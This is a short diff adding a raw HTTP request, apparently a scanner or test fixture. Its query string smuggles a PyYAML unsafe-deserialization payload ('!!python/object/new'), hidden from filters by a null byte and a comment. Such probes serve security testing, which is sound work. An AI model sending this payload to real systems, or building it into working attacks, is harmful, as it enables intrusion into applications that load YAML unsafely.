@@ -1,0 +1,5 @@
+GET /a?search=!!/*%00*/python/object/new:type
+%20%20args:%20["id",%20!!python/tuple%20[]] HTTP/1.1
+Host: demo.example.com
+Connection: close
+
